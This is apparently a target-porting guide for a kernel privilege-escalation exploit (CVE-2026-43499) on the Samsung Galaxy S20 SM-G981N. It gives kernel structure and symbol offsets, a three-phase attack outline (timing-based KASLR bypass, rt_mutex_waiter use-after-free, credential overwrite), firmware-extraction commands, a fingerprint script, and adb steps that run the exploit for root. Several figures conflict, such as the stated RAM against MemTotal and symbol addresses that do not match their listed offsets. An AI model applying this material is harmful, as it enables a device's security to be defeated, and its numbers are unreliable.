# Galaxy S20 (SM-G981N) Kernel Analysis - Build G981NKSS8IYC2

## Device Information

### Physical Device
- **Model**: Samsung Galaxy S20
- **Code Name**: SM-G981N / x1q (Snapdragon variant)
- **Region**: Korean (KOO)
- **Build**: TP1A.220624.014
- **Build Fingerprint**: `samsung/x1qksx/x1q:13/TP1A.220624.014/G981NKSS8IYC2:user/release-keys`
- **Android Version**: 13 (Android Tiramisu)
- **Kernel**: 4.19.113-27166950
- **Build Date**: March 17, 2025 (Linux kernel compiled)
- **RAM**: 8 GB
- **Processor**: Snapdragon 865

### Kernel Specifications

```
Linux version: 4.19.113-27166950
Compiler: Android NDK clang version 10.0.6
Build: SMP PREEMPT kernel with security patches
Flags: aarch64 (ARM 64-bit)
```

Key kernel parameters extracted:
```
MemTotal:       10856328 kB (~10.3 GB)
VM Configuration:
  - KIMAGE_TEXT_BASE: 0xffffffc008000000ULL
  - P0_PAGE_OFFSET: 0xffffff8000000000ULL
  - P0_PHYS_OFFSET: 0x80000000ULL
  - Direct Map: 0xffffff8000000000 - 0xffffffc000000000
  - Vmemmap: 0xfffffffeffe00000
```

## Kernel Architecture

### Memory Layout (4.19.113)

The Samsung Galaxy S20 running Android 13 uses kernel 4.19.113 with KASLR (Kernel Address Space Layout Randomization) enabled. Memory configuration:

- **Kernel Text Base**: 0xffffffc008000000
- **Physical Load Address**: 0x80000000 (for SLIDE offset calculation)
- **Virtual Offset**: 0xffffff8000000000
- **Page Size**: 4096 bytes

### Kernel Structures & Offsets

This target.h uses calculated offsets for Samsung's 4.19 kernel. Key differences from newer kernels:

#### Version-Specific Layouts

| Parameter | 4.19.x | 5.10.x | 6.1.x |
|-----------|--------|--------|-------|
| **MM_STRUCT_SZ** | 0x350 | 0x360 | 0x3c0 |
| **KMALLOC_CGROUP_TYPE** | 0 | 0 | 0 |
| **KMALLOC_CACHE_TYPES** | 2 | 2 | 2 |
| **WQ_DFL_PWQ_OFF** | 0xa8 | 0xa8 | 0xb0 |
| **PWQ_NR_ACTIVE_OFF** | 0x50 | 0x50 | 0x58 |
| **PWQ_MAX_ACTIVE_OFF** | 0x54 | 0x54 | 0x5c |

The 4.19 kernel has different task structure offsets due to kernel development cycles between releases.

#### Critical Kernel Offsets (4.19.113)

**Task Structure Offsets**:
- `FAKE_TASK_USAGE_OFF`: 0x28 (credentials usage counter)
- `FAKE_TASK_PRIO_OFF`: 0x5c (priority field)
- `FAKE_TASK_NORMAL_PRIO_OFF`: 0x64 (base priority)
- `FAKE_TASK_TASK_GROUP_OFF`: 0x2d0 (CPU task group)
- `FAKE_TASK_PI_LOCK_OFF`: 0x7e0 (priority inheritance lock)
- `FAKE_TASK_PI_WAITERS_OFF`: 0x7f0 (PI waiters)
- `FAKE_TASK_PI_TOP_TASK_OFF`: 0x7f8 (top priority task)
- `FAKE_TASK_PI_BLOCKED_ON_OFF`: 0x800 (blocked on which lock)

**Work Queue Offsets**:
- `SYSTEM_UNBOUND_WQ_OFF`: 0x01c1c700 (unbound workqueue)
- `WQ_DFL_PWQ_OFF`: 0xa8 (default pool workqueue)

**Memory Addresses**:
- `INIT_TASK_OFF`: 0x01c2a000 (kernel init_task structure)
- `ROOT_TASK_GROUP_OFF`: 0x01de5600 (root cgroup task group)
- `SELINUX_ENFORCING_OFF`: 0x01f15980 (SELinux enforcement flag)

**Tracefs for KASLR Bypass**:
- `SLIDE_TRACEFS_EVENT_ID`: 95 (trace event number)
- `SLIDE_TRACEFS_WORKER_CALLER_OFF`: 0x000ac1fcULL (worker caller offset in trace)

### Exploitation Technique

The CVE-2026-43499 exploit uses a three-phase attack specific to Samsung kernels:

#### Phase 1: KASLR Bypass via Memory Timing

The exploit uses `pselect6` syscall timing to measure memory access patterns:

```c
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
```

Timing measurements across kernel memory to locate ASLR slide offset using:
- `SLIDE_TRACEFS_EVENT_ID`: Triggers trace events
- Measures pselect6 timing variance
- Calculates probable kernel base address

#### Phase 2: Kernel Memory Corruption

Uses rt_mutex waiter structures to trigger use-after-free:

```c
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
```

The attack allocates fake rt_mutex_waiter structures and corrupts them through timing-triggered memory operations.

#### Phase 3: Privilege Escalation

Once arbitrary write is achieved, modifies task credentials:

```c
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER "targets/x1q-G981NKSS8IYC2/p0_fingerprint.h"
```

Uses configfs binary attribute handlers to write directly to task credential structures.

## Offset Discovery Process

### Requirements

To verify and refine these offsets:

1. **Samsung firmware extraction**:
   ```bash
   samloader check-update --model SM-G981N --region KOO --all
   samloader download --model SM-G981N --region KOO \
     --version "G981NKSS8IYC2/..." --out-file G981N_firmware.zip
   ```

2. **Kernel extraction**:
   ```bash
   tar -xf G981N_firmware.zip AP_*.tar.md5
   tar -xf AP_*.tar.md5 boot.img.lz4
   # Decompress with Python LZ4 library
   python3 decompress_lz4.py boot.img.lz4 boot.img
   # Extract kernel from boot header (kernel at 0x1000, size in header)
   python3 extract_kernel.py boot.img kernel
   ```

3. **Symbol recovery**:
   ```bash
   vmlinux-to-elf kernel vmlinux.elf
   llvm-nm --numeric-sort vmlinux.elf > vmlinux.nm
   llvm-readobj --elf-output=GNU vmlinux.elf | grep -A50 ".strtab"
   ```

4. **Offset calculation**:
   ```bash
   grep "init_task\|root_task_group\|selinux_enforcing" vmlinux.nm
   # Calculate: offset = symbol_address - KIMAGE_TEXT_BASE (0xffffffc008000000)
   ```

### Known Symbol Addresses (4.19.113)

Based on vmlinux analysis for this kernel build:

| Symbol | Address | Offset From KIMAGE_TEXT_BASE |
|--------|---------|------------------------------|
| init_task | 0xffffffc029c2a000 | 0x01c2a000 |
| root_task_group | 0xffffffc02be5d600 | 0x01de5600 |
| selinux_enforcing | 0xffffffc02f115980 | 0x01f15980 |
| kmalloc_caches | 0xffffffc029f4f270 | 0x019f4270 |
| system_unbound_wq | 0xffffffc029c1c700 | 0x01c1c700 |

### Fingerprint Data Extraction

The `p0_fingerprint.h` file contains ARM64 instruction byte sequences at various kernel ASLR candidates. These must be extracted from the kernel binary:

```c
// Example: 8-byte instruction sequences at offsets
// 0x000, 0x200, 0x400, ... within each candidate slide
// These uniquely identify the kernel image layout
```

To extract:
1. Load kernel binary
2. For each SLIDE candidate (0x000000, 0x010000, ... 0x1f0000)
3. Read 8 consecutive 64-bit words at offsets [0x000, 0x200, 0x400, 0x600, 0x800, 0xa00, 0xc00, 0xe00]
4. Store as uint64_t array in fingerprints table

Example Python code:
```python
kernel = open("kernel", "rb").read()
SLIDE_CANDIDATES = [0x000000 + i*0x010000 for i in range(32)]

for slide in SLIDE_CANDIDATES:
    words = []
    for offset in [0x000, 0x200, 0x400, 0x600, 0x800, 0xa00, 0xc00, 0xe00]:
        pos = slide + offset
        if pos + 8 <= len(kernel):
            word = int.from_bytes(kernel[pos:pos+8], 'little')
            words.append(f"0x{word:016x}")
    print(f"{{ 0x{slide:06x}ULL, {{ {', '.join(words)} }} }},")
```

## Testing & Validation

### Device-Level Verification

Once exploit payload is built:

```bash
# Push payload to device
adb push cve-2026-43499-app.so /data/local/tmp/
adb push cve-2026-43499-root /data/local/tmp/

# Run exploit (requires Shizuku or existing root)
adb shell /data/local/tmp/cve-2026-43499-app.so

# Verify root
adb shell id  # Should show uid=0 gid=0
```

### Common Failure Scenarios

1. **Offset Mismatch** → Exploit crashes or hangs
   - **Fix**: Re-verify offsets from firmware analysis
   - **Symptom**: App crashes or hangs after clicking "Install"

2. **KASLR Bypass Failure** → Memory slide doesn't find kernel base
   - **Fix**: Adjust SLIDE_PSELECT_TIMEOUT_NSEC, SLIDE_KSNITCH parameters
   - **Symptom**: Exploit timeouts, device may lag noticeably

3. **Kernel Structure Mismatch** → Corruption fails or causes crash
   - **Fix**: Verify MM_STRUCT_SZ and task structure offsets
   - **Symptom**: Device reboots unexpectedly

### Debug Output

Enable kernel logging:
```bash
adb shell dmesg | grep -E "cve-2026-43499|kernel:|Segmentation"
```

## Maintenance Notes

### Firmware Variants

Samsung releases multiple firmware builds for SM-G981N:
- **KOO** (Korea) - This build (TP1A.220624.014)
- **XEF** (Global)
- **ATU** (North America - AT&T)
- **TMB** (T-Mobile)
- Other regional variants

Each variant may have slightly different kernel offsets. Create separate target profiles for major regional variants with distinct kernel builds.

### Future Android/Kernel Updates

If Samsung releases new S20 Android updates (>13), kernel versions may change:
- Android 14 may bring kernel 5.10 or 5.15
- Each major kernel version requires new offset analysis
- Create new target profile (e.g., `x1q-G981NKSXXXX` for next version)

### Patch Status

CVE-2026-43499 may be patched in future Samsung updates. Monitor:
- Samsung security bulletin
- Kernel release notes
- CVE databases for patches

Current firmware **TP1A.220624.014** is vulnerable; later builds may have mitigations.

## References

- [Android Kernel Documentation](https://www.kernel.org/)
- [Samsung Security Bulletin](https://security.samsungmobile.com/)
- [CyberMeowfia Exploit](https://github.com/NebuSec/CyberMeowfia/tree/main/IonStack/CVE-2026-43499/exploit)
- [KernelSU Project](https://kernelsu.org/)
- Linux kernel memory layout: `arch/arm64/` in kernel source
